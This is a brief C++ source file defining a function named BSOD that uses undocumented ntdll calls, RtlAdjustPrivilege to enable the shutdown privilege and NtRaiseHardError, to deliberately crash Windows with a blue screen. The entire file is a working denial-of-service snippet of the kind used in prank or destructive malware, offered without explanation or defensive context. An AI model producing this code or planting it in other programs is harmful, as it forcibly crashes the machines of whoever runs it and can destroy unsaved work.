#pragma comment(lib, "ntdll.lib")
#include <iostream>
#include <Windows.h>

EXTERN_C NTSTATUS NTAPI RtlAdjustPrivilege(ULONG, BOOLEAN, BOOLEAN, PBOOLEAN);
EXTERN_C NTSTATUS NTAPI NtRaiseHardError(NTSTATUS ErrorStatus, ULONG NumberOfParameters, ULONG UnicodeStringParameterMask,
	PULONG_PTR Parameters, ULONG ValidRespnseOption, PULONG Response);

int BSOD() {
	BOOLEAN b;

	unsigned long response;

	RtlAdjustPrivilege(19, true, false, &b);
	NtRaiseHardError(STATUS_ASSERTION_FAILURE, 0, 0, 0, 6, &response);
	return 0;
}
